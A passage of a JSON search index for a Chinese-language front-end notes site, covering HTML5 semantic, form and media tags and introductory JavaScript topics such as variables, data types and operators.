更友好\",\"可移植性好，可以大量应用在移动设备上\"]}]},\"/front-end/html-notes/07-HTML5%E6%96%B0%E5%A2%9E%E8%AF%AD%E4%B9%89%E5%8C%96%E6%A0%87%E7%AD%BE.html\":{\"title\":\"HTML5新增语义化标签\",\"contents\":[{\"header\":\"新增布局标签\",\"slug\":\"新增布局标签\",\"contents\":[\"<header> 头部标签\",\"<nav> 导航标签\",\"<article> 内容标签\",\"<section> 定义文档某个区域\",\"<aside> 侧边栏标签\",\"<footer> 尾部标签\",\"HTML5新增语义化标签01.png\",\"关于 article 和 section：\",\"artical 里面可以有多个 section\",\"section 强调的是分段或分块，如果你想将一块内容分成几段的时候，可使用 section 元素\",\"article 比 section 更强调独立性，一块内容如果比较独立、比较完整，应该使用 article 元素\"]},{\"header\":\"新增状态标签\",\"slug\":\"新增状态标签\",\"contents\":[]},{\"header\":\"meter 标签\",\"slug\":\"meter-标签\",\"contents\":[\"语义：定义已知范围内的标量测量。也被称为 gauge （尺度），双标签，例如：电量、磁盘用量等\",\"常用属性如下：\",\"属性\",\"值\",\"描述\",\"heigh\",\"数值\",\"规定高值\",\"low\",\"数值\",\"规定低值\",\"max\",\"数值\",\"规定最大值\",\"min\",\"数值\",\"规定最小值\",\"optimum\",\"数值\",\"规定最优值\",\"value\",\"数值\",\"规定当前值\"]},{\"header\":\"progress 标签\",\"slug\":\"progress-标签\",\"contents\":[\"语义：显示某个任务完成的进度的指示器，一般用于表示进度条，双标签，例如：工作完成进度等\",\"常用属性如下：\",\"属性\",\"值\",\"描述\",\"max\",\"数值\",\"规定目标值\",\"value\",\"数值\",\"规定当前值\"]},{\"header\":\"新增列表标签\",\"slug\":\"新增列表标签\",\"contents\":[\"标签名\",\"语义\",\"单/双标签\",\"datalist\",\"用于搜索框的关键字提示\",\"双\",\"details\",\"用于展示问题和答案，或对专有名词进行解释\",\"双\",\"summary\",\"写在 details 的里面，用于指定问题或专有名词\",\"双\",\"<input type=\\\"text\\\" list=\\\"mydata\\\" /> <datalist id=\\\"mydata\\\"> <option value=\\\"周冬雨\\\">周冬雨</option> <option value=\\\"周杰伦\\\">周杰伦</option> <option value=\\\"温兆伦\\\">温兆伦</option> <option value=\\\"马冬梅\\\">马冬梅</option> </datalist> <details> <summary>如何走上人生巅峰？</summary> <p>一步一步走呗</p> </details> \"]},{\"header\":\"新增文本标签\",\"slug\":\"新增文本标签\",\"contents\":[]},{\"header\":\"文本注音\",\"slug\":\"文本注音\",\"contents\":[\"标签名\",\"语义\",\"单/双标签\",\"ruby\",\"包裹需要注音的文字\",\"双\",\"rt\",\"写注音，rt 标签写在 ruby 的里面\",\"双\",\"<ruby> <span>魑魅魍魉</span> <rt>chī mèi wǎng liǎng </rt> </ruby> \"]},{\"header\":\"文本标记\",\"slug\":\"文本标记\",\"contents\":[\"标签名\",\"语义\",\"单/双标签\",\"mark\",\"标记\",\"双\",\"注意： W3C 建议 mark 用于标记搜索结果中的关键字\"]}]},\"/front-end/html-notes/08-HTML5%E6%96%B0%E5%A2%9E%E8%A1%A8%E5%8D%95%E5%8A%9F%E8%83%BD.html\":{\"title\":\"HTML5新增表单功能\",\"contents\":[{\"header\":\"表单控件新增属性\",\"slug\":\"表单控件新增属性\",\"contents\":[\"属性\",\"值\",\"说明\",\"required\",\"required\",\"表单拥有该属性表示其内容不能为空，必填\",\"placeholder\",\"提示文本\",\"表单的提示信息，存在默认值将不显示\",\"autofocus\",\"autofocus\",\"自动聚焦属性，页面加载完成自动聚焦到指定表单\",\"autocomplete\",\"off/on\",\"当用户在字段开始键入时，浏览器基于之前键入过的值，应该显示出在字段中填写的选项。默认已经打开，需放在表单内，同时加上 name 属性，同时成功提交\",\"multiple\",\"multiple\",\"可以多选文件提交\",\"pattern\",\"regexp\",\"填写正则表达式，适用于文本输入类表单控件\",\"补充：通过如下方法可以设置 placeholder 里面的字体颜色\",\"input::placeholder{ color:pink; } \"]},{\"header\":\"input 新增属性值\",\"slug\":\"input-新增属性值\",\"contents\":[\"在 HTML 5 中，帮我们新增加了很多类型的表单\",\"案例代码：\",\"<!-- 我们验证的时候必须添加 form 表单域 --> <form action=\\\"\\\"> <ul> <li>邮箱: <input type=\\\"email\\\" /></li> <li>网址: <input type=\\\"url\\\" /></li> <li>日期: <input type=\\\"date\\\" /></li> <li>时间: <input type=\\\"time\\\" /></li> <li>数量: <input type=\\\"number\\\" /></li> <li>手机号码: <input type=\\\"tel\\\" /></li> <li>搜索: <input type=\\\"search\\\" /></li> <li>颜色: <input type=\\\"color\\\" /></li> <li>范围: <input type=\\\"range\\\" /></li> <!-- 当我们点击提交按钮就可以验证表单了 --> <li> <input type=\\\"submit\\\" value=\\\"提交\\\"></li> </ul> </form> \",\"常见输入类型：\",\"text password radio checkbox button file hidden submit reset image \",\"新的输入类型：\",\"属性值\",\"说明\",\"type=\\\"email\\\"\",\"限制用户输入必须为 email 类型\",\"type=\\\"url\\\"\",\"限制用户输入必须为 url 类型\",\"type=\\\"data\\\"\",\"限制用户输入必须为日期类型\",\"type=\\\"time\\\"\",\"限制用户输入必须为时间类型\",\"type=\\\"month\\\"\",\"限制用户输入必须为月份类型\",\"type=\\\"week\\\"\",\"限制用户输入必须为周类型\",\"type=\\\"number\\\"\",\"限制用户输入必须为数字类型\",\"type=\\\"tel\\\"\",\"手机号码\",\"type=\\\"search\\\"\",\"搜索框\",\"type=\\\"color\\\"\",\"生成一个颜色选择表单\",\"type=\\\"range\\\"\",\"范围选择框，默认值为 50 ，表单提交时不会验证格式\",\"type=\\\"datetime-local\\\"\",\"日期+时间选择框，默认值为空，表单提交时不会验证格式\"]},{\"header\":\"form 标签新增属性\",\"slug\":\"form-标签新增属性\",\"contents\":[\"属性名\",\"功能\",\"novalidate\",\"如果给 form 标签设置了该属性，表单提交的时候不再进行验证\"]}]},\"/front-end/html-notes/09-HTML5%E6%96%B0%E5%A2%9E%E5%A4%9A%E5%AA%92%E4%BD%93%E6%A0%87%E7%AD%BE.html\":{\"title\":\"HTML5新增多媒体标签\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"多媒体标签分为音频 audio 和视频 video 两个标签，使用它们，我们可以很方便的在页面中嵌入音频和视频，而不再去使用落后的 flash 和其他浏览器插件了\"]},{\"header\":\"视频标签 - video\",\"slug\":\"视频标签-video\",\"contents\":[]},{\"header\":\"基本使用\",\"slug\":\"基本使用\",\"contents\":[\"当前 <video> 元素支持三种视频格式：尽量使用 mp4 格式的视频\",\"使用语法：\",\"<video src=\\\"文件地址\\\"></video> \",\"浏览器\",\"MP 4\",\"WebM\",\"Ogg\",\"Internet Explorer\",\"yes\",\"no\",\"no\",\"Chrome\",\"yes\",\"yes\",\"yes\",\"Firefox\",\"yes\",\"yes\",\"yes\",\"Safari\",\"yes\",\"no\",\"no\",\"Opera\",\"yes\",\"yes\",\"yes\"]},{\"header\":\"兼容写法\",\"slug\":\"兼容写法\",\"contents\":[\"由于各个浏览器的支持情况不同，所以我们会有一种兼容性的写法，这种写法了解一下即可\",\"<video controls=\\\"controls\\\" width=\\\"300\\\"> <source src=\\\"move.ogg\\\" type=\\\"video/ogg\\\" > <source src=\\\"move.mp4\\\" type=\\\"video/mp4\\\" > 您的浏览器暂不支持 <video> 标签播放视频 </ video > \",\"上面这种写法，浏览器会匹配 video 标签中的 source，如果支持就播放，如果不支持往下匹配，直到没有匹配的格式，就提示文本\"]},{\"header\":\"video 常用属性\",\"slug\":\"video-常用属性\",\"contents\":[\"属性\",\"值\",\"描述\",\"autoplay\",\"autoplay\",\"视频就绪自动播放（谷歌浏览器需要添加 muted 来解决自动播放的问题）\",\"controls\",\"controls\",\"向用户显示播放控件\",\"width\",\"px（像素）\",\"设置播放器宽度\",\"height\",\"px（像素）\",\"设置播放器高度\",\"loop\",\"loop\",\"播放完是否继续播放该视频，循环播放\",\"preload\",\"auto（预先加载视频）、none（不预先加载视频）\",\"规定是否预加载视频（如果有了 autoplay 就忽略该属性）\",\"src\",\"url\",\"视频 URL 地址\",\"poster\",\"imgurl\",\"加载等待的画面图片\",\"muted\",\"muted\",\"静音播放\",\"属性很多，需重点掌握：\",\"autoplay 自动播放 \",\"注意： 在 google 浏览器上面，默认禁止了自动播放，如果想要自动播放的效果，需要设置 muted 属性\",\"width 宽度\",\"height 高度\",\"loop 循环播放\",\"src 播放源\",\"muted 静音播放\",\"示例代码：\",\"<video src=\\\"media/mi. mp 4\\\" autoplay=\\\"autoplay\\\" muted=\\\"muted\\\" loop=\\\"loop\\\" poster=\\\"media/mi 9. jpg\\\"></video> \"]},{\"header\":\"音频标签 - audio\",\"slug\":\"音频标签-audio\",\"contents\":[]},{\"header\":\"基本使用\",\"slug\":\"基本使用-1\",\"contents\":[\"当前 <audio> 元素支持三种视频格式：尽量使用 mp3 格式\",\"使用语法：\",\"<audio src=\\\"文件地址\\\"></audio> \",\"浏览器\",\"MP 3\",\"Wav\",\"Ogg\",\"Internet Explorer\",\"yes\",\"no\",\"no\",\"Chrome\",\"yes\",\"yes\",\"yes\",\"Firefox\",\"yes\",\"yes\",\"yes\",\"Safari\",\"yes\",\"yes\",\"no\",\"Opera\",\"yes\",\"yes\",\"yes\"]},{\"header\":\"兼容写法\",\"slug\":\"兼容写法-1\",\"contents\":[\"由于各个浏览器的支持情况不同，所以我们会有一种兼容性的写法，这种写法了解一下即可\",\"< audio controls=\\\"controls\\\" > <source src=\\\"happy.mp3\\\" type=\\\"audio/mpeg\\\" > <source src=\\\"happy.ogg\\\" type=\\\"audio/ogg\\\" > 您的浏览器暂不支持 <audio> 标签。 </ audio> \",\"上面这种写法，浏览器会匹配 audio 标签中的 source，如果支持就播放，如果不支持往下匹配，直到没有匹配的格式，就提示文本\"]},{\"header\":\"audio 常用属性\",\"slug\":\"audio-常用属性\",\"contents\":[\"属性\",\"值\",\"描述\",\"autoplay\",\"autoplay\",\"如果出现该属性，则音频在就绪后马上播放\",\"controls\",\"controls\",\"如果出现该属性，则向用户显示控件，比如播放按钮\",\"loop\",\"loop\",\"如果出现该属性，则每当音频结束时重新开始播放\",\"src\",\"url\",\"要播放的音频的 url\",\"示例代码：\",\"<audio src=\\\"media/music. mp 3\\\" autoplay=\\\"autoplay\\\" controls=\\\"controls\\\"></audio> \"]},{\"header\":\"小结\",\"slug\":\"小结\",\"contents\":[\"音频标签和视频标签使用方式基本一致\",\"浏览器支持情况不同\",\"谷歌浏览器把音频和视频自动播放禁止了\",\"我们可以给视频标签添加 muted 属性来静音播放视频，音频不可以（可以通过 JavaScript 解决）\",\"视频标签是重点，我们经常设置自动播放，不使用 controls 控件，循环和设置大小属性\"]}]},\"/front-end/html-notes/10-HTML5%E6%96%B0%E5%A2%9E%E5%85%A8%E5%B1%80%E5%B1%9E%E6%80%A7.html\":{\"title\":\"HTML5新增全局属性\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"属性名\",\"功能\",\"contenteditable\",\"表示元素是否可被用户编辑，可选值：true：可编辑false：不可编辑\",\"draggable\",\"表示元素可以被拖动，可选值：true：可拖动false：不可拖动\",\"hidden\",\"隐藏元素\",\"spellcheck\",\"规定是否对元素进行拼写和语法检查，可选值：true：检查false：不检查\",\"contextmenu\",\"规定元素的上下文菜单，在用户鼠标右击元素时显示\",\"data-*\",\"用于存储页面的私有定制数据\"]}]},\"/front-end/html-notes/11-HTML5%E5%85%BC%E5%AE%B9%E6%80%A7%E5%A4%84%E7%90%86.html\":{\"title\":\"HTML5兼容性处理\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"添加元信息，让浏览器处于最优渲染模式\",\"<!--设置IE总是使用最新的文档模式进行渲染--> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=Edge\\\"> <!--优先使用 webkit ( Chromium ) 内核进行渲染, 针对360等浏览器--> <meta name=\\\"renderer\\\" content=\\\"webkit\\\"> \",\"使用 html5shiv 让低版本浏览器认识 H5 的语义化标签\",\"<!--[if lt ie 9]> <script src=\\\"../sources/js/html5shiv.js\\\"></script> <![endif]--> \",\"扩展：\",\"lt 小于\",\"lte 小于等于\",\"gt 大于\",\"gte 大于等于\",\"! 逻辑非\",\"示例：\",\"<!--[if IE 8]>仅IE8可见<![endif]--> <!--[if gt IE 8]>仅IE8以上可见<![endif]--> <!--[if lt IE 8]>仅IE8以下可见<![endif]--> <!--[if gte IE 8]>IE8及以上可见<![endif]--> <!--[if lte IE 8]>IE8及以下可见<![endif]--> \"]}]},\"/front-end/html-notes/\":{\"title\":\"HTML笔记\",\"contents\":[]},\"/front-end/javascript-notes/01-JavaScript%E5%9F%BA%E7%A1%80-%E7%AE%80%E4%BB%8B.html\":{\"title\":\"JavaScript基础-简介\",\"contents\":[{\"header\":\"JavaScript 的组成\",\"slug\":\"javascript-的组成\",\"contents\":[\"ECMASCRIPT: 定义了 JavaScript 的语法规范, 描述了语言的基本语法和数据类型\",\"BOM (Browser Object Model): 浏览器对象模型\",\"有一套成熟的可以操作浏览器的 API，通过 BOM 可以操作浏览器。比如： 弹出框、浏览器跳转、获取分辨率等\",\"DOM (Document Object Model): 文档对象模型\",\"有一套成熟的可以操作页面元素的 API，通过 DOM 可以操作页面中的元素。比如： 增加一个 div，减少个一div，给 div 换个位置等\"]},{\"header\":\"JavaScript 用途\",\"slug\":\"javascript-用途\",\"contents\":[\"常见的网页效果，如表单验证，轮播图等\",\"与 H5配合实现游戏\",\"实现应用级别的程序\",\"实现图表统计效果\",\"可以实现人工智能\",\"后端开发，app开发，桌面端开发等\"]},{\"header\":\"JavaScript 的语言风格和特性\",\"slug\":\"javascript-的语言风格和特性\",\"contents\":[\"类 C 语言风格，容易上手\",\"弱类型（动态类型），简单易学\",\"丰富的功能，无敌的生态，强大的性能\"]}]},\"/front-end/javascript-notes/02-JavaScript%E5%9F%BA%E7%A1%80-%E5%BC%95%E5%85%A5%E6%96%B9%E5%BC%8F.html\":{\"title\":\"JavaScript基础-引入方式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"JavaScript 程序不能独立运行，它需要被嵌入 HTML 中，然后浏览器才能执行 JavaScript 代码。通过 script 标签将 JavaScript 代码引入到 HTML 中\"]},{\"header\":\"内部方式\",\"slug\":\"内部方式\",\"contents\":[\"通过 script 标签包裹 JavaScript 代码\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 引入方式</title> </head> <body> <!-- 内部形式：通过 script 标签包裹 JavaScript 代码 --> <script> // JavaScript代码 </script> </body> </html> \",\"注意：将 JavaScript 代码放在 HTML 页面的底部附近通常是最好的策略\"]},{\"header\":\"外部方式\",\"slug\":\"外部方式\",\"contents\":[\"一般将 JavaScript 代码写在独立的以 .js 结尾的文件中，然后通过 script 标签的 src 属性引入\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 引入方式</title> </head> <body> <!-- 外部形式：通过 script 的 src 属性引入独立的 .js 文件 --> <script src=\\\"xxx.js\\\"></script> </body> </html> \",\"如果 script 标签使用 src 属性引入了某 .js 文件，那么标签的代码会被忽略！！！\",\"如下代码所示：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 引入方式</title> </head> <body> <!-- 外部形式：通过 script 的 src 属性引入独立的 .js 文件 --> <script src=\\\"xxx.js\\\"> // 此处的代码会被忽略掉！！！！ // JavaScript代码 </script> </body> </html> \"]},{\"header\":\"内联方式\",\"slug\":\"内联方式\",\"contents\":[\"代码写在标签内部\",\"例：\",\"<body> <button onclick=\\\"alert('逗你玩~~~')“>点我</button> </body> \"]}]},\"/front-end/javascript-notes/03-JavaScript%E5%9F%BA%E7%A1%80-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA.html\":{\"title\":\"JavaScript基础-输入输出\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"输入和输出也可理解为人和计算机的交互，用户通过键盘、鼠标等向计算机输入信息，计算机处理后再展示结果给用户，这便是一次输入和输出的过程\",\"JavaScript本身没有任何打印或者输出的函数，但是我们可以使用其它方式输出和输入数据\"]},{\"header\":\"输出\",\"slug\":\"输出\",\"contents\":[\"JavaScript 可以接收用户的输入，然后再将输入的结果输出：alert()、document.write()、console.log()\",\"alert() 或 document.write() 会在浏览器中展示（输出）给用户\",\"console.log() 可以在控制台打印\",\"后面章节会深入探讨以上方法，目前学习的内容是为了方便我们在运行程序时看到结果\"]},{\"header\":\"输入\",\"slug\":\"输入\",\"contents\":[\"向 prompt() 输入任意内容会以弹窗形式出现在浏览器中，一般提示用户输入一些内容\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 输入输出</title> </head> <body> <script> // 1. 展示给用户 document.write('要输出的内容') alert('要输出的内容'); // 2. 以弹窗形式提示用户输入姓名，注意这里的文字使用英文的引号 prompt('请输入您的姓名:') </script> </body> </html> \"]}]},\"/front-end/javascript-notes/04-JavaScript%E5%9F%BA%E7%A1%80-%E6%B3%A8%E9%87%8A%E4%B8%8E%E7%BB%93%E6%9D%9F%E7%AC%A6.html\":{\"title\":\"JavaScript基础-注释与结束符\",\"contents\":[{\"header\":\"注释\",\"slug\":\"注释\",\"contents\":[\"通过注释可以阻止代码被执行或者添加备注信息，JavaScript 支持两种形式注释语法\"]},{\"header\":\"单行注释\",\"slug\":\"单行注释\",\"contents\":[\"使用 // 注释单行代码\",\"VSCode中快捷键：ctrl+/\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 注释</title> </head> <body> <script> // 这种是单行注释的语法 // 一次只能注释一行 // 可以重复注释 </script> </body> </html> \"]},{\"header\":\"多行注释\",\"slug\":\"多行注释\",\"contents\":[\"使用 /* */ 注释多行代码\",\"VSCode中快捷键：shift+alt+A\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 注释</title> </head> <body> <script> /* 这种的是多行注释的语法 */ /* 更常见的多行注释是这种写法 可以任意换行 多少行都可以 */ </script> </body> </html> \"]},{\"header\":\"结束符\",\"slug\":\"结束符\",\"contents\":[\"在 JavaScript 中 ; 代表一段代码的结束，多数情况下可以省略 ; 使用回车（enter）替代\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 结束符</title> </head> <body> <script> alert(1); alert(2); alert(1) alert(2) </script> </body> </html> \",\"实际开发中有许多人主张书写 JavaScript 代码时省略结束符 ;\"]}]},\"/front-end/javascript-notes/05-JavaScript%E5%9F%BA%E7%A1%80-%E5%8F%98%E9%87%8F.html\":{\"title\":\"JavaScript基础-变量\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"变量指的是在程序中保存数据的一个容器，变量是计算机内存中存储数据的标识符，根据变量名称可以获取到内存中存储的数据，也就是说，我们向内存中存储了一个数据，然后要给这个数据起一个名字，为了是我们以后再次找到它\"]},{\"header\":\"定义变量及赋值\",\"slug\":\"定义变量及赋值\",\"contents\":[\"// 定义一个变量 var num // 给一个变量赋值 num = 100 // 定义一个变量的同时给其赋值 var num2 = 200 \",\"注意：\",\"一个变量名只能存储一个值\",\"当再次给一个变量赋值的时候，前面一次的值就没有了\",\"变量名称区分大小写（JS 严格区分大小写）\"]},{\"header\":\"变量的命名规则和命名规范\",\"slug\":\"变量的命名规则和命名规范\",\"contents\":[\"规则： 必须遵守的，不遵守就是错\",\"一个变量名称可以由数字、字母、英文下划线 _、美元符号 $ 组成\",\"严格区分大小写\",\"不能由数字开头\",\"不能是保留字或者关键字\",\"不要出现空格\",\"规范： 建议遵守的（开发者默认），不遵守不会报错\",\"变量名尽量有意义（语义化）\",\"遵循驼峰命名规则，由多个单词组成的时候，从第二个单词开始首字母大写\",\"不要使用中文\"]},{\"header\":\"变量提示\",\"slug\":\"变量提示\",\"contents\":[\"变量声明的提升：可以提前使用一个稍后才声明的变量，而不会引发异常\",\"在执行所有代码前，JS 有预解析阶段，会预读所有变量的声明（不会提升赋值，只会提升定义）\",\"// 变量声明提升的只是定义，不提升赋值！！！ // 先使用变量 console.log(a) // undefined var a = 10 // 后定义变量 console.log(a) // 10 \",\"实际的情况相当于：\",\"var a console.log(a) // undefined a = 10 console.log(a) // 10 \"]}]},\"/front-end/javascript-notes/06-JavaScript%E5%9F%BA%E7%A1%80-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.html\":{\"title\":\"JavaScript基础-数据类型\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"数据类型是指存储在内存中的数据的类型，通常分为两大类 基本数据类型 和 复杂数据类型\"]},{\"header\":\"基本数据类型\",\"slug\":\"基本数据类型\",\"contents\":[\"基本数据类型又叫做简单类型或者值类型，在存储时变量中存储的是值本身，因此叫做值类型，如 string，number，boolean，undefined，null\",\"数值类型（number） \",\"一切数字都是数值类型（包括二进制，十进制，十六进制等）\",\"NaN（not a number），一个非数字，NaN 代表一个计算错误，它是一个不正确的或一个未定义的数学操作所得到的结果，NaN 是粘性的，任何对 NaN 的操作都会返回 NaN\",\"字符串类型（string） \",\"被引号包裹的所有内容（可以是单引号''也可以是双引号\\\"\\\"）,单引号和双引号没有本质上的区别，推荐使用单引号\",\"注意： \",\"无论单引号或是双引号必须成对使用\",\"单引号/双引号可以互相嵌套，但是不可以自已嵌套自已\",\"必要时可以使用转义符 \\\\，输出单引号或双引号\",\"布尔类型（boolean） \",\"只有两个（true 或者 false）\",\"null类型（null） \",\"只有一个，就是 null，表示”空“、”无“或”值未知“的意思\",\"未定义类型（undefined） \",\"未定义是比较特殊的类型，只有一个值 undefined，只声明变量，不赋值的情况下，变量的默认值为 undefined，一般很少直接为某个变量赋值为 undefined\"]},{\"header\":\"复杂数据类型\",\"slug\":\"复杂数据类型\",\"contents\":[\"复杂数据类型，在存储时变量中存储的仅仅是地址（引用），因此叫做引用数据类型\",\"通过 new 关键字创建的对象（系统对象、自定义对象），如 Object、Array、Date 等\"]},{\"header\":\"判断数据类型\",\"slug\":\"判断数据类型\",\"contents\":[\"使用 typeof 关键字来检测数据类型\",\"// 第一种使用方式 var n1 = 100 console.log(typeof n1)// number // 第二种使用方式 var s1 = 'abcdefg' console.log(typeof(s1))// string \"]},{\"header\":\"数据类型转换\",\"slug\":\"数据类型转换\",\"contents\":[\"数据类型之间的转换，比如数字转成字符串，字符串转成布尔，布尔转成数字等\",\"JavaScript 是弱类型语言：JavaScript 也不知道变量到底属于哪种数据类型，只有赋值了才清楚\"]},{\"header\":\"其他数据类型转成数值\",\"slug\":\"其他数据类型转成数值\",\"contents\":[\"Number(变量)\",\"可以把一个变量强制转换成数值类型\",\"可以转换小数，会保留小数\",\"可以转换布尔值\",\"遇到不可转换的都会返回 NaN\",\"parseInt(变量)\",\"从第一位开始检查，是数字就转换，直到一个不是数字的内容\",\"开头就不是数字，那么直接返回 NaN\",\"不认识小数点，只能保留整数\",\"parseFloat(变量)\",\"从第一位开始检查，是数字就转换，直到一个不是数字的内容\",\"开头就不是数字，那么直接返回 NaN\",\"认识一次小数点\",\"除了加法以外的数学运算\",\"运算符两边都是可运算数字才行\",\"如果运算符任何一边不是一个可运算数字，那么就会返回 NaN\",\"加法不可以用\"]},{\"header\":\"其他数据类型转成字符串\",\"slug\":\"其他数据类型转成字符串\",\"contents\":[\"变量.toString()\",\"有一些数据类型不能使用 toString() 方法，比如 undefined 和 null\",\"String(变量)\",\"所有数据类型都可以\",\"使用加法运算\",\"在 JS 里面，+ 由两个含义 \",\"字符串拼接： 只要 + 任意一边是字符串，就会进行字符串拼接\",\"加法运算：只有 + 两边都是数字的时候，才会进行数学运算\"]},{\"header\":\"其他数据类型转成布尔\",\"slug\":\"其他数据类型转成布尔\",\"contents\":[\"Boolean(变量)\",\"在 js 中，只有 ''、0、null、undefined、NaN，这些是 false\",\"其余都是 true\"]},{\"header\":\"数据类型之间存储的区别\",\"slug\":\"数据类型之间存储的区别\",\"contents\":[\"既然我们区分了基本数据类型和复杂数据类型，那么他们之间就一定会存在一些区别，他们最大的区别就是在存储上的区别\",\"我们的存储空间分成两种：\",\"栈： 主要存储基本数据类型的内容\",\"堆： 主要存储复杂数据类型的内容\"]},{\"header\":\"基本数据类型在内存中的存储情况\",\"slug\":\"基本数据类型在内存中的存储情况\",\"contents\":[\"var num = 100，在内存中的存储情况，直接在 栈空间 内有存储一个数据\"]},{\"header\":\"复杂数据类型在内存中的存储情况\",\"slug\":\"复杂数据类型在内存中的存储情况\",\"contents\":[\"复杂数据类型的存储\",\"在堆里面开辟一个存储空间\",\"把数据存储到存储空间内\",\"把存储空间的地址赋值给栈里面的变量\"]},{\"header\":\"数据类型之间比较的区别\",\"slug\":\"数据类型之间比较的区别\",\"contents\":[\"基本数据类型是 值 之间的比较\",\"var num = 1 var str = '1' console.log(num == str) // true \",\"复杂数据类型是 地址 之间的比较\",\"var obj = { name: 'Jack' } var obj2 = { name: 'Jack' } console.log(obj == obj2) // false \",\"因为我们创建了两个对象，那么就会在 堆空间 里面开辟两个存储空间存储数据（两个地址），虽然存储的内容是一样的，那么也是两个存储空间，两个地址，复杂数据类型之间就是地址的比较，所以 obj 和 obj2 两个变量的地址不一样，所以我们得到的就是 false\"]}]},\"/front-end/javascript-notes/07-JavaScript%E5%9F%BA%E7%A1%80-%E8%BF%90%E7%AE%97%E7%AC%A6.html\":{\"title\":\"JavaScript基础-运算符\",\"contents\":[{\"header\":\"算术运算符\",\"slug\":\"算术运算符\",\"contents\":[\"算术运算符：也叫数学运算符，主要包括加、减、乘、除、取余（求模）等\",\"+\",\"只有符号两边都是数字的时候才会进行加法运算\",\"只要符号任意一边是字符串类型，就会进行字符串拼接\",\"-\",\"会执行减法运算\",\"会自动把两边都转换成数字进行运算\",\"*\",\"会执行乘法运算\",\"会自动把两边都转换成数字进行运算\",\"/\",\"会执行除法运算\",\"会自动把两边都转换成数字进行运算\",\"%\",\"会执行取余运算\",\"会自动把两边都转换成数字进行运算\",\"注意：在计算失败时，显示的结果是 NaN（not a number）\"]},{\"header\":\"赋值运算符\",\"slug\":\"赋值运算符\",\"contents\":[\"赋值运算符：对变量进行赋值的运算符\",\"= 将等号右边的值赋予给左边, 要求左边必须是一个容器\",\"运算符\",\"作用\",\"+=\",\"加法赋值\",\"-+\",\"减法赋值\",\"*=\",\"乘法赋值\",\"/=\",\"除法赋值\",\"%=\",\"取余赋值\"]},{\"header\":\"比较运算符\",\"slug\":\"比较运算符\",\"contents\":[\"使用场景：比较两个数据是否相等，根据比较结果返回一个布尔值（true / false）\",\"运算符\",\"作用\",\">\",\"左边是否大于右边\",\"<\",\"左边是否小于右边\",\">=\",\"左边是否大于或等于右边\",\"<=\",\"左边是否小于或等于右边\",\"===\",\"左右两边是否类型和值都相等（重点）\",\"==\",\"左右两边值是否相等\",\"!=\",\"左右值不相等\",\"!==\",\"左右两边是否不全等\",\"例：\",\" console.log(3 > 5) console.log(3 >= 3) console.log(2 == 2) // 比较运算符有隐式转换 把'2' 转换为 2 双等号 只判断值 console.log(2 == '2') // true // console.log(undefined === null) // === 全等 判断 值 和 数据类型都一样才行 // 以后判断是否相等 请用 === console.log(2 === '2') console.log(NaN === NaN) // NaN 不等于任何人，包括他自己 console.log(2 !== '2') // true console.log(2 != '2') // false console.log('-------------------------') console.log('a' < 'b') // true console.log('aa' < 'ab') // true console.log('aa' < 'aac') // true console.log('-------------------------') \"]},{\"header\":\"逻辑运算符\",\"slug\":\"逻辑运算符\",\"contents\":[]},{\"header\":\"基本使用\",\"slug\":\"基本使用\",\"contents\":[\"使用场景：可以把多个布尔值放到一起运算，最终返回一个布尔值\",\"符号\",\"名称\",\"日常读法\",\"特点\",\"口诀\",\"&&\",\"逻辑与\",\"并且\",\"符号两边有一个假的结果为假\",\"一假则假\",\"||\",\"逻辑或\",\"或者\",\"符号两边有一个真的结果为真\",\"一真则真\",\"!\",\"逻辑非\",\"取反\",\"true变false false变true\",\"真变假，假变真\",\"A\",\"B\",\"A && B\",\"A || B\",\"!A\",\"false\",\"false\",\"false\",\"false\",\"true\",\"false\",\"true\",\"false\",\"true\",\"true\",\"true\",\"false\",\"false\",\"true\",\"false\",\"true\",\"true\",\"true\",\"true\",\"false\",\" // 逻辑与 一假则假 console.log(true && true) console.log(false && true) console.log(3 < 5 && 3 > 2) console.log(3 < 5 && 3 < 2) console.log('-----------------') // 逻辑或 一真则真 console.log(true || true) console.log(false || true) console.log(false || false) console.log('-----------------') // 逻辑非 取反 console.log(!true) console.log(!false) console.log('-----------------') let num = 6 console.log(num > 5 && num < 10) console.log('-----------------') \"]},{\"header\":\"逻辑中断\",\"slug\":\"逻辑中断\",\"contents\":[\"断路：只存在于 && 和 || 中，当满足一定条件会让右边代码不执行\",\"符号\",\"短路条件\",\"&&\",\"左边为 false 就断路\",\"||\",\"左边为 true 就断路\",\"原因：通过左边能得到整个式子的结果，因此没必要再判断右边\",\"运算结果：无论 && 还是 ||，运算结果都是最后被执行的表达式值，一般用在变量赋值\",\"例：\",\"console.log(false && 20) //false console.log(5 < 3 && 20) //false console.log(undefined && 20) //undefined console.log(null && 20) //null console.log(0 && 20) //0 console.log(10 && 20) //20 console.log(false || 20) //20 console.log(5 < 3 || 20) //20 console.log(undefined || 20) //20 console.log(null || 20) //20 console.log(0 || 20) //20 console.log(10 || 20) //10 \"]},{\"header\":\"逻辑运算符优先级\",\"slug\":\"逻辑运算符优先级\",\"contents\":[\"！> && > 